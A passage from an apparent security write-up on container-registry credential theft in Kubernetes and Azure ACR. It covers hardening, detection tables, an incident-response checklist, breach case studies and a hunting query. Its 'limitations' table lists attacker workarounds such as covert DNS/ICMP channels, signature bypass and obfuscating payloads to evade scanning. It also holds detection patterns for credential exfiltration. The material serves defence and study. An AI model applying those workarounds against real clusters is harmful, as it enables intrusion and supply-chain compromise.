- Multiple HEAD requests (inspection)
- User-Agent containing `containers` or `go-containerregistry`

---

## 10. DEFENSIVE MITIGATIONS

### A. Prevention (Hardening)

| Control | Implementation | Impact |
|---|---|---|
| **Use Workload Identity** | Replace long-lived ImagePullSecrets with Azure Workload Identity (OIDC) | Eliminates stored credentials; uses short-lived tokens |
| **Use Kubelet Managed Identity** | Configure AKS kubelet with managed identity; ACR pull automatically | No credentials stored in cluster |
| **RBAC Least Privilege** | Restrict `get/list secrets` to service accounts requiring it | Reduces lateral movement post-compromise |
| **Encrypt Secrets at Rest** | Enable `--encryption-provider-config` on kube-apiserver | Credentials encrypted in etcd; resistant to node compromise |
| **NetworkPolicy** | Deny pod-to-registry traffic except for authorized workloads | Limits registry access, prevents mass image theft |
| **Image Scanning** | Scan images for embedded credentials before deployment | Catches hardcoded secrets before deployment |
| **Credential Rotation** | Rotate registry credentials monthly; revoke leaked credentials immediately | Limits blast radius of credential leakage |

**Hardening Manifest Example:**
```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: myapp
automountServiceAccountToken: false  # ← CRITICAL
---
apiVersion: v1
kind: Pod
metadata:
  name: myapp-pod
spec:
  serviceAccountName: myapp
  securityContext:
    runAsNonRoot: true
    fsGroup: 2000
  containers:
  - name: app
    image: myregistry.azurecr.io/myapp:latest
    imagePullPolicy: Always  # Force pull to catch poisoned images
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsUser: 1000
---
# Use Workload Identity instead of ImagePullSecrets
apiVersion: aadpodidentity.k8s.io/v1
kind: AzureIdentity
metadata:
  name: myapp-identity
spec:
  type: 0  # Service Principal
  resourceID: /subscriptions/.../resourceGroups/.../providers/Microsoft.ManagedIdentity/userAssignedIdentities/myapp-identity
  clientID: "00000000-0000-0000-0000-000000000000"
---
apiVersion: aadpodidentity.k8s.io/v1
kind: AzureIdentityBinding
metadata:
  name: myapp-identity-binding
spec:
  azureIdentity: myapp-identity
  selector: myapp
---
# Pod uses workload identity (no ImagePullSecrets needed)
apiVersion: v1
kind: Pod
metadata:
  name: myapp-pod
  labels:
    aadpodidbinding: myapp
spec:
  # No imagePullSecrets specified
  containers:
  - name: app
    image: myregistry.azurecr.io/myapp:latest
```

---

### B. Detection (Monitoring)

| Indicator | Detection Method | Response |
|---|---|---|
| **Secret access** | Kubernetes audit logs; verb=get, resource=secrets | Alert; investigate pod origin |
| **Registry auth failure** | Registry access logs; status=401, 403 | Investigate user/IP; possible credential compromise |
| **Credential exfiltration** | Network DLP; base64-encoded auth in egress traffic | Kill pod; revoke credentials immediately |
| **Layer inspection** | Registry API logs; manifest/blob requests without pull | Investigate IP; block if suspicious |
| **Image push with malicious payload** | Image scanning on push; layer analysis | Reject push; investigate requester |

---

## 11. INCIDENT RESPONSE PLAYBOOK

**Phase 1: Containment (T+0-15 minutes)**
```
[ ] Identify source pod/node
[ ] Kill pod or cordon node
[ ] Revoke all registry credentials used by compromised service account
[ ] Block pod's RBAC permission to access secrets
[ ] Preserve evidence (pod logs, audit logs, network flows)
```

**Phase 2: Eradication (T+15-60 minutes)**
```
[ ] Rotate all registry credentials (immediate replacement)
[ ] Audit all images pushed by compromised service account (check for malware)
[ ] Rollback deployments using potentially malicious images
[ ] Update pod spec to use Workload Identity instead of ImagePullSecrets
[ ] Re-deploy with new credentials
```

**Phase 3: Recovery (T+60-240 minutes)**
```
[ ] Monitor registry for new push/pull by compromised accounts
[ ] Scan all container images in registry for embedded credentials
[ ] Implement image signing & verification
[ ] Enable RBAC audit logging for secrets
[ ] Configure SIEM rules for credential access patterns
```

---

## 12. RELATED ATTACK CHAINS

| Technique ID | Name | Relationship |
|---|---|---|
| **T1190** | Exploit Public-Facing Application | Initial RCE → pod execution → token theft |
| **T1087.004** | Cloud Service Discovery | Enumerate images in registry (post-token theft) |
| **T1536** | Data from Cloud Storage | Exfiltrate private images for offline analysis |
| **T1565** | Data Destruction | Delete images from registry to disrupt service |
| **T1199** | Trusted Relationship | Supply chain: push malicious image for downstream consumption |
| **T1134** | Token Impersonation | Use stolen credentials to impersonate legitimate service account |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: NetSPI – ACR Credentials in Terraform Script

**Scenario:** Azure Storage Blob exposed Terraform state file containing ACR admin credentials

**Attack Timeline:**
- **Day 0:** Attacker discovers exposed storage account; downloads terraform.tfstate
- **Day 1:** Extracts ACR admin username/password from tfstate
- **Day 2:** Authenticates to ACR; lists all images (50+ private images)
- **Day 3:** Pulls sensitive images; analyzes layers for embedded secrets
- **Day 4:** Discovers database credentials in image environment variables
- **Day 5:** Accesses production database; exfiltrates customer data

**Impact:** Database breach; 10,000+ customer records compromised

**Reference:** [NetSPI: Attacking ACRs with Compromised Credentials](https://www.netspi.com/blog/technical-blog/cloud-pentesting/attacking-acrs-with-compromised-credentials/)

---

### Example 2: Kroll – ImagePullSecrets Leaked via Base64

**Scenario:** Security scanning tool missed base64-encoded secrets in YAML manifests

**Attack Timeline:**
- **Week 1:** Developer checks in pod manifest with ImagePullSecrets to GitHub
- **Week 2:** Attacker fork repository; searches for "imagepullsecrets"
- **Week 3:** Decodes base64 dockerconfigjson; obtains registry credentials
- **Week 4:** Attacker has been pulling images for analysis for 7 days undetected

**Impact:** Private code repositories exposed; supply chain at risk

**Reference:** [Kroll: Secret Leak in Software Supply Chain](https://www.kroll.com/en/publications/cyber/secret-leaks-issue-software-supply-chain-security)

---

### Example 3: Docker Hub – 10,000+ Exposed Secrets in Public Images

**Scenario:** Container images with embedded credentials (Dockerfile ENV, shell scripts) pushed to public registry

**Attack Timeline:**
- Developers use hardcoded credentials in Dockerfile (convenience)
- Images pushed to Docker Hub (assumed private, but actually public)
- Automated scanners discover exposed credentials (AWS keys, Slack tokens, GitHub PATs)
- Attackers use credentials for lateral movement, data exfiltration

**Impact:** 10,000+ vulnerable images; hundreds of organizations affected

**Reference:** [Flare.io: Thousands of Exposed Secrets Found on Docker Hub](https://flare.io/learn/resources/docker-hub-secrets-exposed/)

---

## 14. LIMITATIONS & MITIGATIONS

### Limitations of Technique

| Limitation | Details | Workaround |
|---|---|---|
| **Token expiration** | Registry tokens may have TTL (hours to days) | Steal refresh token; pivot to service account identity |
| **RBAC restriction** | Pod may lack `get secrets` permission | Escalate to node; access kubelet or etcd directly |
| **Network isolation** | NetworkPolicy may block registry access | Use DNS/ICMP covert channel; pivot through allowed service |
| **Image signing** | Images may be signed; verify before deployment | Signature bypass; replace with signed malicious image |
| **Scanning detection** | Image scanning may detect malicious payload | Use packers/obfuscators; blend malicious code as legitimate library |

---

## 15. DETECTION & INCIDENT RESPONSE

### Detection Strategies

**Real-Time Indicators:**
1. **Pod accessing multiple ImagePullSecrets** in short timeframe
2. **Skopeo/Crane user-agent** in registry access logs
3. **Manifest/blob requests without corresponding pull** (inspection without download)
4. **Service account using unusual registry** (e.g., dev account accessing prod registry)

**Hunting Queries:**
```sql
-- Find pods accessing ImagePullSecrets
SELECT timestamp, pod_name, namespace, secret_name, action
FROM k8s_audit
WHERE verb = 'get' AND objectRef.resource = 'secrets' 
  AND objectRef.name LIKE '%registry%'
  AND sourceIPs NOT IN (allowed_pod_ips)
ORDER BY timestamp DESC
```

---

## 16. REFERENCES & ADDITIONAL RESOURCES

### Official Documentation
- [Kubernetes Secrets](https://kubernetes.io/docs/concepts/configuration/secret/)
- [Docker Registry API](https://docs.docker.com/registry/spec/api/)
- [Azure Container Registry Documentation](https://learn.microsoft.com/en-us/azure/container-registry/)

### Security Research
- [MITRE ATT&CK T1528](https://attack.mitre.org/techniques/T1528/)
- [NetSPI: Attacking ACRs](https://www.netspi.com/blog/technical-blog/cloud-pentesting/attacking-acrs-with-compromised-credentials/)
- [GitGuardian: Secrets in Kubernetes](https://blog.gitguardian.com/how-to-handle-secrets-in-kubernetes/)

### Tooling
- [Skopeo GitHub](https://github.com/containers/skopeo)
- [Crane GitHub](https://github.com/google/go-containerregistry)
- [Atomic Red Team – T1528](https://github.com/redcanaryco/atomic-red-team)

---
